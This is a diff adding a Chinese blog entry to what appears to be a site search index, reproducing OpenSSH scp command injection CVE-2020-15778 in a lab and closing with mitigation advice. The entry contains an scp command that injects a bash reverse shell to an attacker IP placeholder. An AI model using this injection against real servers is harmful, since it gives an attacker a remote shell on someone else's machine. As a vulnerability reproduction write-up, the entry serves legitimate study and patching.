@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>OpenSSH命令注入漏洞复现(CVE-2020-15778)</title>
+    <link href="/2022/10/26/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/"/>
+    <url>/2022/10/26/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/</url>
+    
+    <content type="html"><![CDATA[<p>OpenSSH命令注入漏洞复现(CVE-2020-15778)</p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ol><li>漏洞描述</li><li>漏洞等级</li><li>漏洞影响版本</li><li>漏洞复现</li><li>修复建议</li></ol><h4 id="01-漏洞描述"><a href="#01-漏洞描述" class="headerlink" title="01_漏洞描述"></a>01_漏洞描述</h4><p>​OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p><p>​2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p><p>利用条件:知道目标机的ssh密码。</p><p>漏洞利用场景:一般在特定环境下利用，比如在知道SSH账户密码后，但禁用SSH登陆或SSH连接被阻止，服务器允许使用scp传文件的情况下，可对其进行命令注入，所以如果攻击者不知道ssh账密，此漏洞无法利用。</p><h4 id="02-漏洞等级"><a href="#02-漏洞等级" class="headerlink" title="02_漏洞等级"></a>02_漏洞等级</h4><p><strong>高危</strong></p><h4 id="03-漏洞影响版本"><a href="#03-漏洞影响版本" class="headerlink" title="03_漏洞影响版本"></a>03_漏洞影响版本</h4><p>OpenSSH &lt;&#x3D; 8.3</p><h4 id="04-漏洞复现"><a href="#04-漏洞复现" class="headerlink" title="04_漏洞复现"></a>04_漏洞复现</h4><p>​scp 是 secure copy 的缩写。在linux系统中，scp用于linux之间复制文件和目录，基于 ssh 登陆进行安全的远程文件拷贝命令。该命令由openssh的scp.c及其他相关代码实现。</p><p>攻击机:Kali(192.168.233.161)</p><p>靶机:Centos7(192.168.233.160)</p><p>1.查看SSH版本,如显示的版本号属于受影响的版本则漏洞存在</p><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026194201452.png" alt="1"></p><p>2.执行scp命令,执行反弹shell</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">scp [上传任意文件] root@靶机IP地址:</span>&#x27;`bash -i &gt;&amp; /dev/tcp/攻击机IP地址/监听的端口 <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>`&#x27;<br></code></pre></td></tr></table></figure><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026195035079.png" alt="2"></p><p>3.打开xxxx端口并监听接受的信息</p><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026195503671.png" alt="3"></p><p>4.在攻击机执行查看IP地址命令,显示出靶机的IP地址则表明反弹成功</p><p><img src="/../images/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-15778/image-20221026195156891.png" alt="4"></p><h4 id="05-修复建议"><a href="#05-修复建议" class="headerlink" title="05_修复建议"></a>05_修复建议</h4><p>5.1 SSH账密确保为强口令且周期性更换密码</p><p>5.2 使用rsync代替SCP</p><p>5.3 升级OpenSSH为最新版openssh-8.8p1.tar.gz  </p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>漏洞复现</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>什么是尾随攻击以及如何保护自己免受攻击</title>
     <link href="/2022/10/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B0%BE%E9%9A%8F%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E5%85%8D%E5%8F%97%E6%94%BB%E5%87%BB/"/>
     <url>/2022/10/23/%E4%BB%80%E4%B9%88%E6%98%AF%E5%B0%BE%E9%9A%8F%E6%94%BB%E5%87%BB%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BF%9D%E6%8A%A4%E8%87%AA%E5%B7%B1%E5%85%8D%E5%8F%97%E6%94%BB%E5%87%BB/</url>
